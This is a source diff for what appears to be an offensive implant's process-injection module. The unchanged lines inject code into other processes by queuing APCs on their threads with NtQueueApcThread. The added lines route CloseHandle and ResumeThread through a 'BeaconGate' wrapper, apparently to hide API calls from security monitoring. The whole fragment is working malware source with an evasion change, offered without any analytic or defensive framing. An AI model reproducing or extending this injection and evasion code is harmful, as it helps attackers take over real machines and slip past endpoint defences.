@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "beacon_gate.h" /* BeaconGate: gate_* = the API with the gate in front */
 #include <Tlhelp32.h>
 #include "beacon.h"
 #include "inject.h"
@@ -135,7 +136,7 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 	}
 
 	if (!Thread32First(hThreadSnap, &t)) {
-		CloseHandle(hThreadSnap);
+		gate_CloseHandle(hThreadSnap);
 		beacon_VirtualFreeEx(injctx->hProcess, remote_context, 0, MEM_RELEASE);
 		beacon_VirtualFreeEx(injctx->hProcess, remote_code, 0, MEM_RELEASE);
 		return FALSE;
@@ -155,13 +156,13 @@ BOOL inject_via_apcthread(INJECTCONTEXT * injctx, LPVOID lpStartAddress, LPVOID 
 		pNtQueueApcThread(hThread, remote_code, remote_context, 0, 0);
 
 		/* close the handle */
-		CloseHandle(hThread);
+		gate_CloseHandle(hThread);
 	} while (Thread32Next(hThreadSnap, &t));
 
 
 	/* kill our thread snapshot too */
 	if (hThreadSnap)
-		CloseHandle(hThreadSnap);
+		gate_CloseHandle(hThreadSnap);
 
 	/* wait... */
 	Sleep(200);
@@ -194,7 +195,7 @@ BOOL inject_via_apcthread_targeted(INJECTCONTEXT * ictx, LPVOID lpStartAddress, 
 		return FALSE;
 
 	/* try to resume the thread... punt if it fails */
-	return ResumeThread(ictx->hThread) != -1;
+	return gate_ResumeThread(ictx->hThread) != -1;
 }
 
 
